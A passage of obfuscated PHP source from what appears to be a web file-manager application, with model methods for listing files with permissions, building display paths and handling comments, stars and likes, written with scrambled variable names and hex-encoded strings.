$Ìß±íÔ£[$áìÜ©¥ì[195]] = !1; $Ìß±íÔ£[$áìÜ©¥ì[194]] = !1; } } if ($Ìß±íÔ£[$áìÜ©¥ì[414]]) { $Ìß±íÔ£[$áìÜ©¥ì[195]] = AuthModel::authCheckEdit($Ìß±íÔ£[$áìÜ©¥ì[414]][$áìÜ©¥ì[415]]); $Ìß±íÔ£[$áìÜ©¥ì[194]] = AuthModel::authCheckView($Ìß±íÔ£[$áìÜ©¥ì[414]][$áìÜ©¥ì[415]]); } $this->groupPathDisplay($Ìß±íÔ£); } unset($Ìß±íÔ£); } public function _listAppendAuthSecret(&$†ûÈé◊Â) { $˜≠‚¬⁄Ñ =& $_SERVER[Çâä∆◊¡]; if (Model($˜≠‚¬⁄Ñ[433])->get($˜≠‚¬⁄Ñ[506]) != $˜≠‚¬⁄Ñ[89]) { return; } static $¨˙Õ⁄≠ = false; if (!$¨˙Õ⁄≠) { $Èñﬂ∂÷¡ = Model($˜≠‚¬⁄Ñ[507]); $˚Ó˚“Ä√ = Model($˜≠‚¬⁄Ñ[508]); $¨˙Õ⁄≠ = $˚Ó˚“Ä√->listData(); $¨˙Õ⁄≠ = array_to_keyvalue($¨˙Õ⁄≠, $˜≠‚¬⁄Ñ[403]); $üÜ∆◊Ä¨ = json_decode(Model($˜≠‚¬⁄Ñ[433])->get($˜≠‚¬⁄Ñ[509]), !0); $üÜ∆◊Ä¨ = array_to_keyvalue($üÜ∆◊Ä¨, $˜≠‚¬⁄Ñ[401]); foreach ($¨˙Õ⁄≠ as $⁄‹˝•Ωî => $É∫£”è≈) { $•í˙Ò“¿ = $üÜ∆◊Ä¨[$É∫£”è≈[$˜≠‚¬⁄Ñ[510]]]; if (!$•í˙Ò“¿) { $˚Ó˚“Ä√->remove($É∫£”è≈[$˜≠‚¬⁄Ñ[401]]); unset($¨˙Õ⁄≠[$⁄‹˝•Ωî]); continue; } $‡ƒ®Ù˚∫ = $Èñﬂ∂÷¡->listData($•í˙Ò“¿[$˜≠‚¬⁄Ñ[414]]); if (!$‡ƒ®Ù˚∫) { $˚Ó˚“Ä√->remove($É∫£”è≈[$˜≠‚¬⁄Ñ[401]]); unset($¨˙Õ⁄≠[$⁄‹˝•Ωî]); continue; } $É∫£”è≈[$˜≠‚¬⁄Ñ[414]] = $‡ƒ®Ù˚∫; $É∫£”è≈[$˜≠‚¬⁄Ñ[511]] = $•í˙Ò“¿; $É∫£”è≈[$˜≠‚¬⁄Ñ[512]] = Model($˜≠‚¬⁄Ñ[513])->getInfoSimpleOuter($É∫£”è≈[$˜≠‚¬⁄Ñ[452]]); $¨˙Õ⁄≠[$⁄‹˝•Ωî] = $É∫£”è≈; } } $îÈ‚œ›ø = defined($˜≠‚¬⁄Ñ[514]) ? USER_ID : $˜≠‚¬⁄Ñ[12]; $÷´Œ€⁄Ë = array(); $‡»èΩ˛† = $this->_listAppendPath($÷´Œ€⁄Ë, !0); foreach ($†ûÈé◊Â as $⁄‹˝•Ωî => &$É∫£”è≈) { if (!is_array($É∫£”è≈[$˜≠‚¬⁄Ñ[414]])) { continue; } if ($É∫£”è≈[$˜≠‚¬⁄Ñ[412]] != $˜≠‚¬⁄Ñ[515]) { continue; } if (isset($¨˙Õ⁄≠[$É∫£”è≈[$˜≠‚¬⁄Ñ[403]]])) { $ù“…—ìß = $¨˙Õ⁄≠[$É∫£”è≈[$˜≠‚¬⁄Ñ[403]]]; if (!is_array($É∫£”è≈[$˜≠‚¬⁄Ñ[465]])) { $É∫£”è≈[$˜≠‚¬⁄Ñ[465]] = array(); } $É∫£”è≈[$˜≠‚¬⁄Ñ[465]][$˜≠‚¬⁄Ñ[516]] = $ù“…—ìß[$˜≠‚¬⁄Ñ[510]]; $É∫£”è≈[$˜≠‚¬⁄Ñ[414]][$˜≠‚¬⁄Ñ[517]] = $ù“…—ìß; $É∫£”è≈[$˜≠‚¬⁄Ñ[414]][$˜≠‚¬⁄Ñ[518]] = $É∫£”è≈[$˜≠‚¬⁄Ñ[519]]; $É∫£”è≈[$˜≠‚¬⁄Ñ[414]][$˜≠‚¬⁄Ñ[520]] = $˜≠‚¬⁄Ñ[89]; if ($ù“…—ìß[$˜≠‚¬⁄Ñ[452]] != $îÈ‚œ›ø) { $É∫£”è≈[$˜≠‚¬⁄Ñ[414]][$˜≠‚¬⁄Ñ[415]] = $É∫£”è≈[$˜≠‚¬⁄Ñ[414]][$˜≠‚¬⁄Ñ[415]] & $ù“…—ìß[$˜≠‚¬⁄Ñ[414]][$˜≠‚¬⁄Ñ[414]]; } continue; } $ﬁ¨–¬ã◊ = $this->parentLevelArray($É∫£”è≈[$˜≠‚¬⁄Ñ[521]]); $Ì‚®ªò∑ = array_reverse($ﬁ¨–¬ã◊); foreach ($Ì‚®ªò∑ as $£®ÇÔÜã => $ÏΩ‹”Å ) { if (!isset($¨˙Õ⁄≠[$ÏΩ‹”Å ])) { continue; } $ù“…—ìß = $¨˙Õ⁄≠[$ÏΩ‹”Å ]; $É∫£”è≈[$˜≠‚¬⁄Ñ[414]][$˜≠‚¬⁄Ñ[517]] = $ù“…—ìß; if ($ù“…—ìß[$˜≠‚¬⁄Ñ[452]] != $îÈ‚œ›ø) { $É∫£”è≈[$˜≠‚¬⁄Ñ[414]][$˜≠‚¬⁄Ñ[415]] = $É∫£”è≈[$˜≠‚¬⁄Ñ[414]][$˜≠‚¬⁄Ñ[415]] & $ù“…—ìß[$˜≠‚¬⁄Ñ[414]][$˜≠‚¬⁄Ñ[414]]; } $ïû—Ï¥Ÿ = $˜≠‚¬⁄Ñ[12]; $–©≠â€ı = count($ﬁ¨–¬ã◊) - $£®ÇÔÜã; for ($óÃ¡ºé— = 0; $óÃ¡ºé— < $–©≠â€ı; $óÃ¡ºé—++) { if (!isset($‡»èΩ˛†[$ﬁ¨–¬ã◊[$óÃ¡ºé—]])) { $ïû—Ï¥Ÿ = $˜≠‚¬⁄Ñ[12]; break; } $ïû—Ï¥Ÿ = $ïû—Ï¥Ÿ . rtrim($‡»èΩ˛†[$ﬁ¨–¬ã◊[$óÃ¡ºé—]], $˜≠‚¬⁄Ñ[8]) . $˜≠‚¬⁄Ñ[8]; } $É∫£”è≈[$˜≠‚¬⁄Ñ[414]][$˜≠‚¬⁄Ñ[518]] = rtrim($ïû—Ï¥Ÿ, $˜≠‚¬⁄Ñ[8]) . $˜≠‚¬⁄Ñ[8]; break; } } unset($É∫£”è≈); } public function groupPathDisplay(&$ÍÀﬁËàŒ) { $øê◊µíπ =& $_SERVER[Çâä∆◊¡]; if ($ÍÀﬁËàŒ[$øê◊µíπ[412]] != self::TYPE_GROUP) { return; } $ñ–ıü±“ = Model($øê◊µíπ[522])->getInfo($ÍÀﬁËàŒ[$øê◊µíπ[504]]); $Àí∑öùØ = $this->parentLevelArray($ñ–ıü±“[$øê◊µíπ[521]]); $®ûïÊ…Õ = $øê◊µíπ[12]; foreach ($Àí∑öùØ as $∑ù¢Ïúã) { $ÍÜù”àÙ = Model($øê◊µíπ[522])->getInfo($∑ù¢Ïúã); $®ûïÊ…Õ .= $ÍÜù”àÙ[$øê◊µíπ[87]][$øê◊µíπ[403]] . $øê◊µíπ[50]; } $ÍÀﬁËàŒ[$øê◊µíπ[523]] = $ñ–ıü±“[$øê◊µíπ[498]]; $ÍÀﬁËàŒ[$øê◊µíπ[524]] = $ñ–ıü±“[$øê◊µíπ[521]]; $ÍÀﬁËàŒ[$øê◊µíπ[525]] = $ñ–ıü±“[$øê◊µíπ[526]]; $ÍÀﬁËàŒ[$øê◊µíπ[527]] = $®ûïÊ…Õ . $ñ–ıü±“[$øê◊µíπ[87]][$øê◊µíπ[403]]; } protected function _listAppendPath(&$–Îﬂë¯ó, $à¥—Íò« = false) { $˝¨˙¢ƒ” =& $_SERVER[Çâä∆◊¡]; static $éÆ–¿ä  = array(); $∫à¸ö‚˙ = array(); $∏æı¿•˚ = array(); if ($à¥—Íò«) { return $éÆ–¿ä ; } foreach ($–Îﬂë¯ó as &$≈ˆ˛ˆ¡) { $øô…≠ø∆ = $≈ˆ˛ˆ¡[$˝¨˙¢ƒ”[403]]; if ($≈ˆ˛ˆ¡[$˝¨˙¢ƒ”[411]] == $˝¨˙¢ƒ”[89] && $≈ˆ˛ˆ¡[$˝¨˙¢ƒ”[498]] != 0) { $éÆ–¿ä [$øô…≠ø∆] = $≈ˆ˛ˆ¡[$˝¨˙¢ƒ”[32]]; } if ($≈ˆ˛ˆ¡[$˝¨˙¢ƒ”[411]] == $˝¨˙¢ƒ”[89] && $≈ˆ˛ˆ¡[$˝¨˙¢ƒ”[498]] == 0 && !isset($éÆ–¿ä [$øô…≠ø∆])) { $éÆ–¿ä [$øô…≠ø∆] = $this->_listAppendPathRoot($≈ˆ˛ˆ¡, array()); } if (isset($∏æı¿•˚[$≈ˆ˛ˆ¡[$˝¨˙¢ƒ”[521]]])) { continue; } $∏æı¿•˚[$≈ˆ˛ˆ¡[$˝¨˙¢ƒ”[521]]] = !0; $≤ñ´Ä≤ƒ = $this->parentLevelArray($≈ˆ˛ˆ¡[$˝¨˙¢ƒ”[521]]); foreach ($≤ñ´Ä≤ƒ as $•Ä˛∑Åñ => $Ò„˛ìâÜ) { if (isset($éÆ–¿ä [$Ò„˛ìâÜ])) { continue; } if ($•Ä˛∑Åñ == 0) { $éÆ–¿ä [$Ò„˛ìâÜ] = $this->_listAppendPathRoot($≈ˆ˛ˆ¡, $≤ñ´Ä≤ƒ); } if ($•Ä˛∑Åñ != 0) { $∫à¸ö‚˙[] = $Ò„˛ìâÜ; } } } unset($≈ˆ˛ˆ¡); $∫à¸ö‚˙ = array_unique($∫à¸ö‚˙); if (count($∫à¸ö‚˙) > 0) { $©ÈÃ›å = array($˝¨˙¢ƒ”[418] => array($˝¨˙¢ƒ”[419], $∫à¸ö‚˙)); if (count($∫à¸ö‚˙) == 1) { $â£≠ØÓ´ = $this->sourceInfo($∫à¸ö‚˙[0]); $•»àŸñÒ = is_array($â£≠ØÓ´) ? array($â£≠ØÓ´) : !1; } else { $•»àŸñÒ = $this->field($˝¨˙¢ƒ”[528])->where($©ÈÃ›å)->select(); } if (!$•»àŸñÒ) { $•»àŸñÒ = array(); } foreach ($•»àŸñÒ as $Á‹ñ…úÁ) { $éÆ–¿ä [$Á‹ñ…úÁ[$˝¨˙¢ƒ”[403]]] = $Á‹ñ…úÁ[$˝¨˙¢ƒ”[32]]; } } $Ç®Ω≈Ãî = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $˝é©˛ïÏ = array(); foreach ($–Îﬂë¯ó as &$≈ˆ˛ˆ¡) { $‘◊Ú≠ÀÓ = $≈ˆ˛ˆ¡[$˝¨˙¢ƒ”[521]]; $è®Á“‹∫ = $˝¨˙¢ƒ”[12]; if (isset($˝é©˛ïÏ[$‘◊Ú≠ÀÓ])) { $è®Á“‹∫ = $˝é©˛ïÏ[$‘◊Ú≠ÀÓ]; } else { $≤ñ´Ä≤ƒ = $this->parentLevelArray($≈ˆ˛ˆ¡[$˝¨˙¢ƒ”[521]]); foreach ($≤ñ´Ä≤ƒ as $•Ä˛∑Åñ => $Ò„˛ìâÜ) { if (isset($éÆ–¿ä [$Ò„˛ìâÜ])) { $è®Á“‹∫ .= $éÆ–¿ä [$Ò„˛ìâÜ] . $˝¨˙¢ƒ”[8]; } } $˝é©˛ïÏ[$‘◊Ú≠ÀÓ] = $è®Á“‹∫; } $è®Á“‹∫ .= $≈ˆ˛ˆ¡[$˝¨˙¢ƒ”[32]]; if ($≈ˆ˛ˆ¡[$˝¨˙¢ƒ”[411]] == $˝¨˙¢ƒ”[89]) { $è®Á“‹∫ .= $˝¨˙¢ƒ”[8]; } $≈ˆ˛ˆ¡[$˝¨˙¢ƒ”[519]] = str_replace($˝¨˙¢ƒ”[529], $˝¨˙¢ƒ”[8], $è®Á“‹∫); if ($≈ˆ˛ˆ¡[$˝¨˙¢ƒ”[498]] == $˝¨˙¢ƒ”[190]) { $≈ˆ˛ˆ¡[$˝¨˙¢ƒ”[32]] = trim($éÆ–¿ä [$≈ˆ˛ˆ¡[$˝¨˙¢ƒ”[403]]], $˝¨˙¢ƒ”[8]); $≈ˆ˛ˆ¡[$˝¨˙¢ƒ”[519]] = $≈ˆ˛ˆ¡[$˝¨˙¢ƒ”[32]] . $˝¨˙¢ƒ”[8]; } if (intval($≈ˆ˛ˆ¡[$˝¨˙¢ƒ”[412]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($≈ˆ˛ˆ¡, $≤ñ´Ä≤ƒ, $Ç®Ω≈Ãî); } } unset($≈ˆ˛ˆ¡); return $–Îﬂë¯ó; } private function _listAppendPathRecycle(&$¡˜ÊﬁŸÁ, $©òû∫ï∆, $»áﬁ˝Ëè) { $©ÉéÜ£È =& $_SERVER[Çâä∆◊¡]; if (!in_array($»áﬁ˝Ëè, $©òû∫ï∆) && $¡˜ÊﬁŸÁ[$©ÉéÜ£È[403]] != $»áﬁ˝Ëè) { return; } $˝˘£Ï©≤ = explode($©ÉéÜ£È[8], trim($¡˜ÊﬁŸÁ[$©ÉéÜ£È[519]], $©ÉéÜ£È[8])); $’˚◊é®ã = implode($©ÉéÜ£È[8], array_slice($˝˘£Ï©≤, 2)); $¡˜ÊﬁŸÁ[$©ÉéÜ£È[519]] = $©ÉéÜ£È[8] . LNG($©ÉéÜ£È[530]) . $©ÉéÜ£È[8] . ltrim($’˚◊é®ã, $©ÉéÜ£È[8]); $¡˜ÊﬁŸÁ[$©ÉéÜ£È[521]] = $©ÉéÜ£È[531] . implode($©ÉéÜ£È[50], array_slice($©òû∫ï∆, 1)) . $©ÉéÜ£È[50]; if ($¡˜ÊﬁŸÁ[$©ÉéÜ£È[403]] == $»áﬁ˝Ëè) { $¡˜ÊﬁŸÁ[$©ÉéÜ£È[521]] = $©ÉéÜ£È[531]; $¡˜ÊﬁŸÁ[$©ÉéÜ£È[498]] = $©ÉéÜ£È[190]; $¡˜ÊﬁŸÁ[$©ÉéÜ£È[32]] = LNG($©ÉéÜ£È[530]); } $¡˜ÊﬁŸÁ[$©ÉéÜ£È[532]] = $©ÉéÜ£È[533]; } protected function _listAppendPathRoot(&$ıπÉ¯€ó, $Ä£·”˝¿) { $∫Ï¢Íü” =& $_SERVER[Çâä∆◊¡]; $ı“Ÿ¸–˛ = $∫Ï¢Íü”[12]; if ($ıπÉ¯€ó[$∫Ï¢Íü”[412]] == self::TYPE_USER) { if (defined($∫Ï¢Íü”[474]) && $ıπÉ¯€ó[$∫Ï¢Íü”[504]] == USER_ID) { $ı“Ÿ¸–˛ = LNG($∫Ï¢Íü”[534]); if (!$Ä£·”˝¿) { $ıπÉ¯€ó[$∫Ï¢Íü”[32]] = $ı“Ÿ¸–˛; } } else { $ê¨˜¸¿˜ = Model($∫Ï¢Íü”[513])->getInfoSimple($ıπÉ¯€ó[$∫Ï¢Íü”[504]]); $ı“Ÿ¸–˛ = LNG($∫Ï¢Íü”[535]) . $∫Ï¢Íü”[159] . $ê¨˜¸¿˜[$∫Ï¢Íü”[32]] . $∫Ï¢Íü”[536]; } } else { if ($ıπÉ¯€ó[$∫Ï¢Íü”[412]] == self::TYPE_GROUP) { $ê¨˜¸¿˜ = Model($∫Ï¢Íü”[522])->getInfoSimple($ıπÉ¯€ó[$∫Ï¢Íü”[504]]); $ı“Ÿ¸–˛ = $ê¨˜¸¿˜[$∫Ï¢Íü”[32]]; } else { if ($ıπÉ¯€ó[$∫Ï¢Íü”[412]] == self::TYPE_SYSTEM) { $ı“Ÿ¸–˛ = $∫Ï¢Íü”[537]; } } } $ı“Ÿ¸–˛ = $ı“Ÿ¸–˛ ? $∫Ï¢Íü”[8] . $ı“Ÿ¸–˛ . $∫Ï¢Íü”[8] : $∫Ï¢Íü”[8]; return $ı“Ÿ¸–˛; } protected function _listAppendUser(&$Œ“›Èº¯) { $ÁÁå¯Õí =& $_SERVER[Çâä∆◊¡]; $é÷ÕÖÎ« = array_to_keyvalue($Œ“›Èº¯, $ÁÁå¯Õí[12], $ÁÁå¯Õí[452]); $éèñüÒ… = array_to_keyvalue($Œ“›Èº¯, $ÁÁå¯Õí[12], $ÁÁå¯Õí[454]); $Õáıú§ˆ = array_merge($é÷ÕÖÎ«, $éèñüÒ…); $ÿ¬õôÃ’ = Model($ÁÁå¯Õí[538])->userListInfo($Õáıú§ˆ); foreach ($Œ“›Èº¯ as &$˙ÏÌ˚∂®) { $§¢œâö‡ = $˙ÏÌ˚∂®[$ÁÁå¯Õí[452]]; $˙ÏÌ˚∂®[$ÁÁå¯Õí[452]] = $ÿ¬õôÃ’[$§¢œâö‡] ? $ÿ¬õôÃ’[$§¢œâö‡] : !1; $§¢œâö‡ = $˙ÏÌ˚∂®[$ÁÁå¯Õí[454]]; $˙ÏÌ˚∂®[$ÁÁå¯Õí[454]] = $ÿ¬õôÃ’[$§¢œâö‡] ? $ÿ¬õôÃ’[$§¢œâö‡] : !1; if (isset($˙ÏÌ˚∂®[$ÁÁå¯Õí[465]]) && $˙ÏÌ˚∂®[$ÁÁå¯Õí[465]][$ÁÁå¯Õí[539]]) { $Ü‚«π≠ã = $GLOBALS[$ÁÁå¯Õí[6]][$ÁÁå¯Õí[90]][$ÁÁå¯Õí[540]]; if ($˙ÏÌ˚∂®[$ÁÁå¯Õí[465]][$ÁÁå¯Õí[541]] <= time() - $Ü‚«π≠ã) { $this->metaSet($˙ÏÌ˚∂®[$ÁÁå¯Õí[403]], $ÁÁå¯Õí[539], null); $this->metaSet($˙ÏÌ˚∂®[$ÁÁå¯Õí[403]], $ÁÁå¯Õí[541], null); unset($˙ÏÌ˚∂®[$ÁÁå¯Õí[465]][$ÁÁå¯Õí[539]]); continue; } $çŸÜŒ¥ú = $˙ÏÌ˚∂®[$ÁÁå¯Õí[465]][$ÁÁå¯Õí[539]]; $˙ÏÌ˚∂®[$ÁÁå¯Õí[465]][$ÁÁå¯Õí[542]] = Model($ÁÁå¯Õí[538])->getInfoSimpleOuter($çŸÜŒ¥ú); } } unset($˙ÏÌ˚∂®); } public function parentLevelArray($›£ÃΩ˙∏) { $Ê»ÅÉó™ =& $_SERVER[Çâä∆◊¡]; $›£ÃΩ˙∏ = explode($Ê»ÅÉó™[50], trim($›£ÃΩ˙∏, $Ê»ÅÉó™[50])); return array_remove_value($›£ÃΩ˙∏, $Ê»ÅÉó™[190]); } public function listAll($ÿ§πÊÏä) { $ÓàØ‚Õ’ =& $_SERVER[Çâä∆◊¡]; $ƒÚ˝√∆ì = $this->sourceInfo($ÿ§πÊÏä); $ïπΩô˜Õ = array($ÓàØ‚Õ’[543] => array($ÓàØ‚Õ’[544], $ƒÚ˝√∆ì[$ÓàØ‚Õ’[521]] . $ÿ§πÊÏä . $ÓàØ‚Õ’[545]), $ÓàØ‚Õ’[546] => 0); $ÖÈ›Í°Ó = $ÓàØ‚Õ’[547]; $„Í¯ó˙Ω = "\114\105\x46\x54\40\112\x4f\x49\x4e\40{$this->tablePrefix}\151\x6f\137\x66\x69\x6c\145\x20\x66\x69\x6c\145\x20\x6f\156\40\x73\x6f\165\162\x63\145\x2e\146\151\154\x65\x49\x44\40\x3d\40\146\x69\x6c\x65\56\x66\151\154\145\111\104"; $òÈÒÄ›∆ = $this->alias($ÓàØ‚Õ’[444])->field($ÖÈ›Í°Ó)->where($ïπΩô˜Õ)->join($„Í¯ó˙Ω)->select(); $this->_listAppendAuth($òÈÒÄ›∆); $this->_listAppendUser($òÈÒÄ›∆); $this->_listAppendPath($òÈÒÄ›∆); $òÈÒÄ›∆ = array_to_keyvalue($òÈÒÄ›∆, $ÓàØ‚Õ’[403]); $∑Ìó∆≤¿ = "\57{$ƒÚ˝√∆ì[$ÓàØ‚Õ’[32]]}\57"; $∑Ìó∆≤¿ = $∑Ìó∆≤¿ == $ÓàØ‚Õ’[529] ? $ÓàØ‚Õ’[8] : $∑Ìó∆≤¿; $ÅÑ°ûËÀ = array(); foreach ($òÈÒÄ›∆ as $µ÷´Ù˝Á => $ÿ–Æã√Ã) { $˜Ç¡¬à÷ = $this->parentLevelArray($ÿ–Æã√Ã[$ÓàØ‚Õ’[521]]); array_shift($˜Ç¡¬à÷); $¿ÏÀÌÀ = $∑Ìó∆≤¿; for ($™—⁄Ïﬂ‚ = 0; $™—⁄Ïﬂ‚ < count($˜Ç¡¬à÷); $™—⁄Ïﬂ‚++) { $¿ÏÀÌÀ .= $òÈÒÄ›∆[$˜Ç¡¬à÷[$™—⁄Ïﬂ‚]][$ÓàØ‚Õ’[32]] . $ÓàØ‚Õ’[8]; } $¿ÏÀÌÀ .= $ÿ–Æã√Ã[$ÓàØ‚Õ’[32]]; if ($ÿ–Æã√Ã[$ÓàØ‚Õ’[411]]) { $¿ÏÀÌÀ .= $ÓàØ‚Õ’[8]; } $¿ÏÀÌÀ = str_replace($ÓàØ‚Õ’[529], $ÓàØ‚Õ’[8], $¿ÏÀÌÀ); $¿ÏÀÌÀ = str_replace($ÓàØ‚Õ’[529], $ÓàØ‚Õ’[8], $¿ÏÀÌÀ); $¸êØÄÍÜ = array($ÓàØ‚Õ’[422] => str_replace($ÓàØ‚Õ’[529], $ÓàØ‚Õ’[8], $¿ÏÀÌÀ), $ÓàØ‚Õ’[548] => intval($ÿ–Æã√Ã[$ÓàØ‚Õ’[411]]), $ÓàØ‚Õ’[87] => $this->pathInfoFilter($ÿ–Æã√Ã)); if (!$ÿ–Æã√Ã[$ÓàØ‚Õ’[411]]) { $¸êØÄÍÜ[$ÓàØ‚Õ’[467]] = $ÿ–Æã√Ã[$ÓàØ‚Õ’[467]]; $¸êØÄÍÜ[$ÓàØ‚Õ’[88]] = $ÿ–Æã√Ã[$ÓàØ‚Õ’[78]]; } $ÅÑ°ûËÀ[] = $¸êØÄÍÜ; } return $ÅÑ°ûËÀ; } } goto f„≈§õÚ√ç; Dâéìò¥¶ê: class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\145\156\x74"; protected $tableMeta = array("\164\141\x62\x6c\x65\116\141\x6d\x65" => "\143\157\x6d\x6d\145\x6e\164\137\155\x65\164\x61", "\155\145\x74\x61\x46\x69\145\154\144" => "\x63\x6f\x6d\x6d\145\156\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Ω’„π∑») { $˜ßŒ∫äÉ =& $_SERVER[Çâä∆◊¡]; if ($Ω’„π∑»[$˜ßŒ∫äÉ[1838]]) { $„Â‚Ü€Ö = $this->where(array($˜ßŒ∫äÉ[1839] => $Ω’„π∑»[$˜ßŒ∫äÉ[1838]]))->find(); if (!$„Â‚Ü€Ö || $„Â‚Ü€Ö[$˜ßŒ∫äÉ[412]] != $Ω’„π∑»[$˜ßŒ∫äÉ[412]] || $„Â‚Ü€Ö[$˜ßŒ∫äÉ[504]] != $Ω’„π∑»[$˜ßŒ∫äÉ[504]]) { return !1; } $this->where(array($˜ßŒ∫äÉ[1839] => $Ω’„π∑»[$˜ßŒ∫äÉ[1838]]))->setAdd($˜ßŒ∫äÉ[1840], 1); } $Ω’„π∑»[$˜ßŒ∫äÉ[1841]] = 0; $Ω’„π∑»[$˜ßŒ∫äÉ[1840]] = 0; $Ω’„π∑»[$˜ßŒ∫äÉ[743]] = 1; return $this->add($Ω’„π∑»); } public function commentCount($ªπÈÌäª, $˚èÇ§€◊, $¸„≈é≥› = false) { $ ü√°œ˚ =& $_SERVER[Çâä∆◊¡]; if (!$ªπÈÌäª) { return array(); } if (is_string($ªπÈÌäª) || is_int($ªπÈÌäª)) { $ªπÈÌäª = array($ªπÈÌäª); } $¿Ÿª¡í∂ = array($ ü√°œ˚[504], $ ü√°œ˚[1842] => $ ü√°œ˚[500]); $‘º•˚“ä = array($ ü√°œ˚[504] => array($ ü√°œ˚[7], $ªπÈÌäª), $ ü√°œ˚[412] => $˚èÇ§€◊); if ($¸„≈é≥›) { $‘º•˚“ä[$ ü√°œ˚[1642]] = $¸„≈é≥›; } $Ú∫“ü€ı = $this->field($¿Ÿª¡í∂)->where($‘º•˚“ä)->group($ ü√°œ˚[504])->select(); return array_to_keyvalue($Ú∫“ü€ı, $ ü√°œ˚[504], $ ü√°œ˚[500]); } public function starTarget($Úçéª†∫, $Ä˝ãØÄ™) { $ëÅœÕËï =& $_SERVER[Çâä∆◊¡]; $‹˙∆ƒùì = $Úçéª†∫ + self::TYPE_STAR_OFFSET; $·–üò€ = array($ëÅœÕËï[1642] => USER_ID, $ëÅœÕËï[412] => $‹˙∆ƒùì, $ëÅœÕËï[504] => $Ä˝ãØÄ™); $„˜ëËí• = $this->where($·–üò€)->find(); if ($„˜ëËí•) { return $this->where(array($ëÅœÕËï[401] => $„˜ëËí•[$ëÅœÕËï[401]]))->delete(); } $ÚÂà‰ﬂ… = array($ëÅœÕËï[1838] => 0, $ëÅœÕËï[1642] => USER_ID, $ëÅœÕËï[743] => 1, $ëÅœÕËï[748] => $ëÅœÕËï[12], $ëÅœÕËï[412] => $‹˙∆ƒùì, $ëÅœÕËï[504] => $Ä˝ãØÄ™, $ëÅœÕËï[1841] => 0, $ëÅœÕËï[1840] => 0); return $this->add($ÚÂà‰ﬂ…); } public function starTargetCount($£ﬁß¥Ó, $º∞æ˝ŒΩ) { $ÚêùÛ∆Ω =& $_SERVER[Çâä∆◊¡]; $Á…ø§—ñ = $º∞æ˝ŒΩ + self::TYPE_STAR_OFFSET; $’ä∏‹âú = $this->commentCount($£ﬁß¥Ó, $Á…ø§—ñ); $Ê’°Ï¿° = $this->commentCount($£ﬁß¥Ó, $Á…ø§—ñ, USER_ID); return array($ÚêùÛ∆Ω[1843] => $’ä∏‹âú, $ÚêùÛ∆Ω[1844] => $Ê’°Ï¿°); } public function starTargetUserList($·˚—„Ãˆ, $ÉΩ≠âﬁÛ) { $áñí±ß“ =& $_SERVER[Çâä∆◊¡]; $ªﬂ¶‚ô• = $·˚—„Ãˆ + self::TYPE_STAR_OFFSET; $˛ÖïÜåö = array($áñí±ß“[504] => $ÉΩ≠âﬁÛ, $áñí±ß“[412] => $ªﬂ¶‚ô•); $´ ø’™ﬁ = $this->where($˛ÖïÜåö)->count(); $πå«¯ÙÀ = array($áñí±ß“[250] => $´ ø’™ﬁ, $áñí±ß“[1845] => array()); if (!$´ ø’™ﬁ) { return $πå«¯ÙÀ; } $ªßœÙé√ = $this->field($áñí±ß“[1642])->where($˛ÖïÜåö)->limit(500)->select(); $ªßœÙé√ = array_to_keyvalue($ªßœÙé√, $áñí±ß“[12], $áñí±ß“[1642]); $πå«¯ÙÀ[$áñí±ß“[1845]] = Model($áñí±ß“[513])->userListInfo($ªßœÙé√); return $πå«¯ÙÀ; } public function prasiseUserList($ΩÊ∏Ëøí) { $±áŸ∂Í∑ =& $_SERVER[Çâä∆◊¡]; $¬∆£†«† = array($±áŸ∂Í∑[1846] => $ΩÊ∏Ëøí); $¡™ùÿ¡£ = $this->where($¬∆£†«†)->find(); $µ¨ÁùÉ◊ = _get($¡™ùÿ¡£, $±áŸ∂Í∑[1841], 0); $¯‹œæõ¥ = array($±áŸ∂Í∑[250] => $µ¨ÁùÉ◊, $±áŸ∂Í∑[1845] => array()); if (!$µ¨ÁùÉ◊) { return $¯‹œæõ¥; } $¥ÒÛá©™ = Model($±áŸ∂Í∑[1847])->field($±áŸ∂Í∑[1642])->where($¬∆£†«†)->limit(500)->select(); $¥ÒÛá©™ = array_to_keyvalue($¥ÒÛá©™, $±áŸ∂Í∑[12], $±áŸ∂Í∑[1642]); $¯‹œæõ¥[$±áŸ∂Í∑[1845]] = Model($±áŸ∂Í∑[513])->userListInfo($¥ÒÛá©™); return $¯‹œæõ¥; } public function remove($÷öÑ‡˛É) { $á˚¨°úÈ =& $_SERVER[Çâä∆◊¡]; $Ïçç∫á‘ = array($á˚¨°úÈ[1839] => $÷öÑ‡˛É); $†—≈Ùäé = $this->where($Ïçç∫á‘)->find(); if ($†—≈Ùäé[$á˚¨°úÈ[1838]]) { $this->where(array($á˚¨°úÈ[1839] => $†—≈Ùäé[$á˚¨°úÈ[1838]]))->setAdd($á˚¨°úÈ[1840], -1); } return $this->where($Ïçç∫á‘)->delete(); } public function edit($È◊ÇŸÜ†, $ﬂúÜê¿’) { $πí©˜•¡ =& $_SERVER[Çâä∆◊¡]; $¡“ÌØö¥ = array($πí©˜•¡[1839] => $È◊ÇŸÜ†); return $this->where($¡“ÌØö¥)->save(array($πí©˜•¡[1848] => $ﬂúÜê¿’)); } public function prasise($ú†ﬁ…ú∫) { $˝§¶°•ó =& $_SERVER[Çâä∆◊¡]; $Ê†ÄÑı´ = Model($˝§¶°•ó[1849]); $•ùÈ‡’ˆ = array($˝§¶°•ó[1839] => $ú†ﬁ…ú∫, $˝§¶°•ó[1633] => USER_ID); $ÒÀÒ€ÿ = $Ê†ÄÑı´->where($•ùÈ‡’ˆ)->find(); if (!$ÒÀÒ€ÿ) { $Ê†ÄÑı´->add($•ùÈ‡’ˆ); $ÜÑƒû∑¸ = $this->where(array($˝§¶°•ó[1839] => $ú†ﬁ…ú∫))->setAdd($˝§¶°•ó[1841], 1); } else { $Ê†ÄÑı´->where($•ùÈ‡’ˆ)->delete(); $ÜÑƒû∑¸ = $this->where(array($˝§¶°•ó[1839] => $ú†ﬁ…ú∫))->setAdd($˝§¶°•ó[1841], -1); } return $ÜÑƒû∑¸; } public function targetInfo($ŒòôÑ◊‘, $√ìî∫†Î) { $ı¸‡°éø =& $_SERVER[Çâä∆◊¡]; $à“›¡ëß = 